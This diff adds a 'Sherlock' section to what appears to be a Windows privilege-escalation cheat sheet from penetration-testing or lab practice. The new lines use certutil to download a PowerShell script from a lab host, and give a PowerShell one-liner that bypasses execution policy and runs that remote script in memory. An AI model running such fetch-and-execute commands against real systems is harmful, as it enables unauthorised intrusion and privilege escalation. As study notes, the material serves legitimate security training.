@@ -38,6 +38,17 @@ python windows-exploit-suggester.py -i systeminfo.txt -d 2021-01-12-mssb.xls
 python3 wes.py sisteminfo.tx
 
 ==============================================================================
+[+] Sherlock
+=============================================================================
+# Local Machine
+cmd /c certutil.exe -urlcache -split -f http://10.10.14.28/Sherlock.ps1
+Import-Module ./Sherlock.ps1
+Find-AllVulns
+
+# On Memory
+powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.28/Sherlock.ps1');
+
+==============================================================================
 [+] AutoLogon credentials 
 ==============================================================================
 # Automatic
